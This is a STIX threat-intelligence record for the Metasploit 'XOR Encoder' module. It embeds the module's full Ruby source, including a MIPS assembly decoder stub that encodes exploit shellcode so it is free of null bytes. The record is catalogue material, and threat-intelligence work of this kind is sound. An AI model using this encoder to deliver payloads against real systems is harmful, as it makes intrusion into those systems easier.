{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--fb3e5217-c2cb-44d3-b309-96ee90d56a24",
    "created": "2024-08-14T16:33:19.23952Z",
    "modified": "2024-08-14T16:33:19.239528Z",
    "name": "XOR Encoder",
    "description": " Mips Web server exploit friendly xor encoder ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/encoders/mipsle/longxor.rb",
            "external_id": "longxor.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nrequire 'metasm'\n\nclass MetasploitModule < Msf::Encoder::Xor\n\n  def initialize\n    super(\n      'Name'             => 'XOR Encoder',\n      'Description'      => %q{\n        Mips Web server exploit friendly xor encoder\n      },\n      'Author'           =>\n        [   'Julien Tinnes <julien[at]cr0.org>',   # original shellcode\n            'Pedro Ribeiro <pedrib@gmail.com>',    # fix Linux >= 2.6.11 and toupper() compat\n        ],\n      'Arch'             => ARCH_MIPSLE,\n      'License'          => MSF_LICENSE,\n      'Decoder'          =>\n        {\n          'KeySize'   => 4,\n          'BlockSize' => 4,\n          'KeyPack'   => 'V',\n        })\n  end\n\n  #\n  # Returns the decoder stub that is adjusted for the size of the buffer\n  # being encoded.\n  #\n  def decoder_stub(state)\n\n    # add one xor operation for the key (see comment below)\n    number_of_passes=state.buf.length/4+1\n    raise EncodingError.new(\"The payload being encoded is too long (#{state.buf.length} bytes)\") if number_of_passes > 10240\n    raise EncodingError.new(\"The payload is not padded to 4-bytes (#{state.buf.length} bytes)\") if state.buf.length%4 != 0\n\n    # 16-bits not (again, see below)\n    reg_10 = (number_of_passes+1)^0xFFFF\n    reg_5 = state.buf.length^0xFFFF\n    decoder = Metasm::Shellcode.assemble(Metasm::MIPS.new(:little), <<EOS).encoded.data\n;\n; MIPS nul-free xor decoder\n;\n; (C) 2006 Julien TINNES\n; <julien at cr0.org>\n;\n; The first four bytes in encoded shellcode must be the xor key\n; This means that you have to put the xor key right after\n; this xor decoder\n; This key will be considered part of the encoded shellcode\n; by this decoder and will be xored, thus becoming 4NULs, meaning nop\n;\n; This is Linux-only because I use the cacheflush system call\n;\n; You can use shellforge to assemble this, but be sure to discard all\n; the nul bytes at the end (everything after x01\\\\x4a\\\\x54\\\\x0c)\n;\n; change 2 bytes in the first instruction's opcode with the number of passes\n; the number of passes is the number of xor operations to apply, which should be\n; 1 (for the key) + the number of 4-bytes words you have in your shellcode\n; you must encode ~(number_of_passes + 1) (to ensure that you're nul-free)\n\n\n;.text\n;.align\t2\n;.globl\tmain\n;.ent\tmain\n;.type\t\t main,@function\n\nmain:\n\nli macro reg, imm\n;\tlui reg, ((imm) >> 16) & 0ffffh\n;\tori reg, reg, (imm) & 0ffffh\n  addiu reg, $0, imm\t\t    ; sufficient if imm.abs <= 0x7fff\nendm\n\n  li(\t$10, #{reg_10})\t\t    ; load number of passes ^ 0xffff\n  nor\t$10, $10, $0\t\t      ; put number of passes in $10\n\n  li(\t$11,-89)\t\t          ; addend to calculated PC is 73\n;.set noreorder\nnext:\n  bltzal  $8, next\n;.set reorder\n  slti    $8, $0, 0x8282\n  nor     $11, $11, $0\t    ; addend in $9\n  addu\t$25, $31, $11\t\t    ; $25 points to encoded shellcode +4\n  addu\t$16, $31, $11\t\t    ; $16 too (used to set up the cacheflush() arg down below)\n\n;\tlui\t$2, 0xDDDD     \t\t    ; first part of the xor (old method)\n  slti\t$23, $0, 0x8282     ; store 0 in $23 (our counter)\n;\tori\t$17, $2, 0xDDDD \t    ; second part of the xor (old method)\n  lw\t$17, -4($25)\t\t      ; load xor key in $17\n\n\n  li(\t$9, -5)\n  nor\t$9, $9, $0\t\t        ; 4 in $9\n\n  addi\t$15, $9, -3\t\t      ; 1 in $15\nloop:\n  lw\t$8, -4($25)\n\n  addu\t$23, $23, $15\t\t    ; increment counter\n  xor\t$3, $8, $17\n  sltu\t$30, $23, $10\t\t    ; enough loops?\n  sw\t$3, -4($25)\n  addi\t$6, $9, -1\t\t      ; 3 in $6 (for cacheflush)\n  bne\t$0, $30, loop\n  addu\t$25, $25, $9\t\t    ; next instruction to decode :)\n\n\n  addiu\t$4, $16, -4         ; cacheflush() addr parameter\n  li(      $10,#{reg_5})    ; cacheflush() nbytes parameter\n  nor   $5, $10, $0         ; same as above\n;   li      $6,3            ; $6 is set above, 3rd arg for cacheflush()\n\n;\t.set    noreorder\n  li(     $2, 4147)         ; cacheflush\n;   .ascii \"\\\\x01JT\\\\x0c\"   ; nul-free syscall\n  syscall 0x52950\n;\t.set    reorder\n\n\n; write last decoder opcode and decoded shellcode\n;\tli      $4,1              ; stdout\n;\taddi\t$5, $16, -8\n;\tli      $6,40             ; how much to write\n;\t.set    noreorder\n;\tli      $2, 4004          ; write\n;\tsyscall\n;\t.set    reorder\n\n\n  nop\t\t\t\t                ; encoded shellcoded must be here (xor key right here ;)\n; $t9 (aka $25) points here\n\nEOS\n    # put the key at the end of the decoder\n    state.decoder_key_offset = decoder.length - 4\n\n    return decoder\n  end\nend\n"
}